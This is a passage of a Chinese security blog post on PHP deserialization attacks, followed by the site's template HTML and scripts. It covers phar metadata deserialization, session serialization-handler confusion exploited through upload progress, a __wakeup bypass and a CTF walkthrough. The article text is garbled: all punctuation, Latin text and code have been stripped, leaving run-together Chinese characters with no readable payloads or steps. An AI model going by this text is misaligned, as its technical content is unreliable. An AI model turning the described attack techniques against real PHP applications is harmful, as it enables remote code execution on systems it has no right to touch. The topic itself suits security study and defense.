量有一个数组其中键值对应后面的同理这里懵逼了半天我以为作者想靠序列化引擎反序列化输入的弄半天只是将内容插入文件中这样由于他是序列化引擎将看做键值分隔符这样就做为后面是值那这一切就说通了与我所见不同的是他这已经是目录穿越进入到文件中了因此他写的内容就直接插入文件并不会被序列化处理嗯大概是这样吧反射类这里是另外一个能利用的类这个类能够直接写比上面的只能读文件更加牛逼这也应该是预期解题目中所有的代码都用上了网上能够搜出来中的用法是那这道题里面该怎么用这个类呢由于要用到这个类里面的这方法因此要用到数组去动态调用类里面的方法输出这里用数组的第一个位置的值是实例化后的类第二个位置的值是类的方法名因此我们要的是先实例化类对象然后再构造出这两个数组最后找到一个能够动态调用的地方再看回题目我们在之前的分析中已经能实现能够实例化自己想要的类了那怎么构造出第一个数组呢再看回这段代码将每一个文件的路径赋值给将赋值给相当于文件的路径存在不等于的情况吗将返回的文件名赋值给列表这里已经为我们准备好了一个数组在构造类对象的时候由于不等于字符串因此是直接放进了数组中然后数组第二位我们需要是这个字符串因此我们可以让同时让这样就能够返回一串字符串添加进数组里面从而完成第一个数组的构造得到接下来就是构造第二个数组和动态调用类方法方法读取文件名从的文件名字里面寻找构造数组动态调用可以看到这里为我们构造了一个数组并且数组的键是从方法获取的而值又是从中的数组里面找的因此我们同样能够控制当使用方法去传递这个参数的时候就能够构造出最后是动态调用这里同样是从中的参数中获取值进行动态调用因此我们只需构造即可综上所述我们写进文件里面的内容是这样就能够了修复修就很简单了既然是因为目录穿越导致能够控制的内容那么修掉目录穿越的地方就好了去掉了导致不可控也就不能穿越了参考安全中原生类的利用反序列化文件本质上是一种压缩文件会以序列化的形式存储用户自定义的当受影响的文件操作函数调用文件时会自动反序列化内的内容什么是文件在软件中归档文件是一种打包格式通过将许多代码文件和其他资源例如图像样式表等捆绑到一个归档文件中来实现应用程序和库的分发通过用户定义和内置的流包装器实现复杂的文件处理功能内置包装器可用于文件系统函数如和就是一种内置的流包装器中一些常见的流包装器如下访问本地文件系统在用文件系统函数时默认就使用该包装器访问网址访问访问各个输入输出流压缩流数据查找匹配的文件路径模式归档音频流处理交互式的流文件的结构格式为前面内容不限但必须以来结尾这部分的目的就是让扩展识别这是一个标准的文件文件标志必须包含结束标志可以省略但语句结束符与的结尾之间不能超过两个空格在生成之前应先添加之前也可添加其他内容伪造成其他文件比如文件本质上是一种压缩文件其中每个被压缩文件的权限属性等信息都放在这部分这部分还会以序列化的形式存储用户自定义的这是漏洞利用最核心的地方这部分就是我们想要压缩在压缩包内部的文件可空签名放在末尾存放归档信息结构如下图所有未使用的标志保留供将来使用并且不得用于存储自定义信息使用每个文件的元数据功能来存储有关特定文件的自定义信息下面生成一个文件前提开启中的后缀名必须为设置将自定义的存入添加要压缩的文件签名自动计算漏洞利用条件文件要能够上传到服务器端要有可用的魔术方法作为跳板文件操作函数的参数可控且等特殊字符没有被过滤受影响的函数中的大部分与文件操作相关函数在通过协议获取数据时会将文件的部分反序列化受影响的函数列表绕过方式当环境限制了不能出现在前面的字符里可以使用和等绕过当环境限制了不能出现在前面的字符里还可以配合其他协议进行利用格式验证可以通过在文件头部添加绕过设置生成一个修改后缀名为实战参考从源码探索利用成功的深层原因流的概念流的作用是在出发地和目的地之间传输数据出发地和目的地可以是文件命令行进程网络连接或压缩文件临时内存标准输入或输出或者是通过流封装协议实现的任何其他资源如果你读写过文件就用过流如果你从读取过数据或者把输入写入也用过流流为的很多函数提供了底层实现如和等的流函数提供了不同资源的统一接口我们可以把流比作管道把水资源数据从一个地方引到另一个地方在水从出发地到目的地的过程中我们可以过滤水可以改变水质可以添加水也可以排出水流封装协议因为流式数据的种类各异而每种类型需要独特的协议以便读写数据我们称这些协议为流封装协议例如我们可以读写文件系统可以通过或与远程服务器通信还可以打开并读写或压缩文件虽然过程是一样的但是读写文件系统中文件的方式与收发消息的方式有所不同流封装协议的作用是使用通用的接口封装这种差异每个流都有一个协议和一个目标指定协议和目标的方法是使用流标识符其中是流的封装协议是流的数据源流封装协议下面使用流封装协议创建了一个与通信的流不要以为这是普通的网页函数的字符串参数其实是一个流标识符协议会让使用流封装协议在这个参数中之后是流的目标注很多开发者可能并不知道普通的其实是流封装协议标识符的伪装流封装协议我们通常使用和等函数读写文件系统因为默认使用的流封装协议是所以我们很少认为这些函数使用的是流下面的示例演示了使用流封装协议创建一个读写文件的流我们通常会省略掉协议因为这是使用的默认值这两段介绍来源于那么这个说明了一个什么问题呢说明我们目前的几乎所有的操作都是通过流配合流包装器来实现的因为默认的包装器就是虽然你没写但是底层还是通过流包装器实现的还有更多使用获取当前系统注册的全部开始向下挖掘我们上面说了文件中存在我们可控的序列化的内容然后我们又说这个内容在文件系统函数配合的时候能实现反序列化但是我们没说为什么这也就是我们这节讨论的重点所有的原因都能从源代码找到答案先看一下文件源代码部分因为是的一个扩展于是我们在的去全局搜索函数如图所示但是这个函数为什么能调用呢这就涉及到了文件系统函数的部分了我们找一下源码位置在这个文件包含了非常多的文件函数的实现我们先全局搜索如图所示然后我们稍微往下翻翻就能发现和处理流相关的函数如图所示我们发现了这个这个函数能处理我们的那么其他的类似的函数是不是也是底层调用了这个函数呢由此及彼我们全局搜索一下然后我们看一下具体的实现如图所示是不是很熟悉这下好了我们不如把源码下载下来来一个真正的全局搜索举一反三我本地使用对整个源码进行了扫描发现了很多很多地方调用了这个函数其实并不只是我们常见的文件系统函数如图所示好家伙太底层了看不懂了日后拜读参考一篇文章带你深入理解反序列化漏洞的实战反序列化简单介绍在计算机中尤其是在网络应用中称为会话控制对象存储特定用户会话所需的属性及配置信息这样当用户在应用程序的页之间跳转时存储在对象中的变量将不会丢失而是在整个用户会话中一直存在下去当用户请求来自应用程序的页时如果该用户还没有会话则服务器将自动创建一个对象当会话过期或被放弃后服务器将终止该会话当第一次访问网站时函数就会创建一个唯一的并自动通过的响应头将这个保存到客户端中同时也在服务器端创建一个以命名的文件用于保存这个用户的会话信息当同一个用户再次访问这个网站时也会自动通过的请求头将中保存的再携带过来这时函数就不会再去分配一个新的而是在服务器的硬盘中去寻找和这个同名的文件将这之前为这个用户保存的会话信息读出在当前脚本中应用达到跟踪这个用户的目的官方定义在计算机中尤其是在网络应用中称为会话控制对象存储特定用户会话所需的属性及配置信息主要有以下特点保存的位置是在服务器端通常是要配合使用因为的无状态性服务端产生了来标识当前的用户状态本质上就是一种可以维持服务器端的数据存储技术即技术就是一种基于后端有别于数据库的临时存储数据的技术的存储机制中的中的内容并不是放在内存中的而是以文件的方式来存储的存储方式就是由配置项来进行确定的默认是以文件的方式存储存储的文件是以来进行命名的运行之后开启并且产生一个唯一的位的文件创建的几个代码中有会自动创建文件如果则在接收请求的时候会自动初始化也就创建了文件不再需要执行但默认情况下这个选项都是关闭的还有一个默认选项默认值为此时用户是可以自己定义的比如我们在里设置将会在服务器上创建一个文件即使此时用户没有初始化也会自动初始化并产生一个键值这个键值有由我们构造的值组成最后被写入文件里注意如果默认配置导致文件上传后文件内容立即清空这时我们就要利用竞争在文件内容清空前进行包含利用工作流程以为例理解的原理脚本使用时开启会话会自动检测如果中存在获取如果中不存在创建一个并通过响应头以形式保存到浏览器初始化超全局变量为一个空数组通过去指定位置文件存储位置匹配对应的文件存在该文件读取文件内容通过反序列化方式将数据存储到中不存在该文件创建一个命名文件程序执行结束将中保存的所有数据序列化存储到对应的文件中具体原理图中一些配置设定用户自定义存储函数如果想使用内置会话存储机制之外的可以使用本函数数据库等方式指定会话模块是否在请求开始时启动一个会话默认为不启动设置文件的存储位置指定会话模块是否在请求开始时启动一个会话默认值为不启动定义用来序列化反序列化的处理器名字默认使用启用上传进度跟踪并填充变量默认启用读取所有数据即完成上传后立即清理进度信息默认启用不同的引擎来处理文件处理器首先来看看默认时候的序列化结果代码如下处理器存储格式键名竖线经过函数反序列处理的值的键名处理器使用处理器即为了更能直观的体现出格式的差别因此这里设置了键值长度为对应的码为所以最终的结果如下图所示键名的长度对应的字符键名经过函数反序列处理的值处理器使用处理器即序列化的结果为表示数组中有个元素花括号里面的内容即为传入参数经过序列化后的值的反序列化漏洞利用的反序列化漏洞就是利用处理器和处理器的存储格式差异而产生通过具体的代码我们来看下漏洞出现的原因引擎的存储格式是键名而引擎的存储格式是如果程序使用两个引擎来分别处理的话就会出现问题该引擎使用的是会把看做键名与值的分割符从而造成了歧义导致其在解析文件时直接对后的值进行反序列化处理引擎只会把当做一个正常的字符具体示例分析首先创建使用处理器来存储数据使用默认处理器来存储数据接着我们构建进行访问打开文件可看到序列化存储的内容漏洞分析在程序执行我们将通过处理器序列化保存成文件由于浏览器中保存的文件名不变当我们访问找到文件并使用处理器反序列化文件内容识别格式即键名竖线经过函数反序列处理的值处理器会以作为分隔符将反序列化就会触发方法最后对象销毁执行方法中的函数相当于执行如下我们访问即可直接执行函数例题找不到原题先跟着做一遍我们可以看到判断可能存在反序列化漏洞根据代码逻辑访问加上参数新建对象触发魔术方法执行函数进一步查看配置可见中当前目录中被设置为因此存在反序列化利用的条件补充知识文件中局部变量作用于当前目录程序会覆盖内容主变量里面的内容那么我们如何找到代码入口将利用代码写入到文件想要写入文件就得想办法在变量中增加我们可控的输入点补充知识上传进度此特性自后可用当选项开启时能够在每一个文件上传时监测上传进度这个信息对上传请求自身并没有什么帮助但在文件上传时可以发送一个请求到终端例如通过来检查这个状态当一个上传在处理中同时一个与中设置的同名变量时上传进度可以在中获得当检测到这种请求时它会在中添加一组数据索引是与连接在一起的值翻译成人话就是当检测上传进度这一特性是开启状态时我们可以在客户端写一个文件上传的功能文件上传的同时一个与中设置的同名变量如下图即可写入进一步序列化写入文件下面是官方给出的一个文件上传时监测进度例子其中也可以设置为在中存储的上传进度如下所示请求时间长度已接收字节是否上传完成上传的文件中设定的变量名文件名其中中的和都是我们可控的输入点下面我们就开始解题拿到首先查询设置表明允许上传进度跟踪并填充变量表明所有数据即完成上传后不清理进度信息变量即允许上传进度跟踪且结束后不清除数据更有利使用来将利用代码写入文件构造表单提交上传文件构造序列化字符串作为利用代码为了防止被转义我们在中加入随意选择文件点击表单提交使用抓包工具抓取请求包并修改值为发送请求包代码执行过程分析因此直接执行并返回查看当前目录构造最终读取文件内容即这里不知道为啥访问不了连接找到了原靶场也不行进行文件包含和反序列化渗透漏洞分析该漏洞存在于小于版本或小于版本中该漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过的执行如下反序列化由于的执行顺序在之前所以会将对象内的所有属性设为在执行时没有内容会写到文件中但使用漏洞可以跳过直接执行这样可以将属性内容写入文件中如果我们使用如下会执行函数页面上会出现如下输出如果我们使用如下会执行函数页面上会出现如下输出这里发现个有趣的事情不能打印出标识符因此要编码一下回答在中是一个标记用于指示代码的起始点当使用函数时它会将其后的内容作为字符串进行输出但是如果你尝试使用输出它将被解释为一个的起始标记而不是普通的字符串为了在中输出这样的标识符你可以使用转义字符来告诉解释器不要将其解释为标记而是作为普通的文本使用函数对字符串进行转义将拆分为两部分并连接起来防御方法严格的把控函数的参数不要给攻击者任何输入的可能在文件系统函数的参数可控时对参数进行严格的过滤严格检查上传文件的内容而不是只检查文件头在条件允许的情况下禁用可执行系统命令代码的危险函数手册',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-04-15 19:49:21',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">浅析反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-07-27T08:46:43.037Z" title="发表于 2023-07-27 16:46:43">2023-07-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-15T11:49:21.305Z" title="更新于 2024-04-15 19:49:21">2024-04-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">24.6k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>99分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="浅析反序列化"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/07/27/qian-xi-fan-xu-lie-hua/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/07/27/qian-xi-fan-xu-lie-hua/" itemprop="commentCount"><i 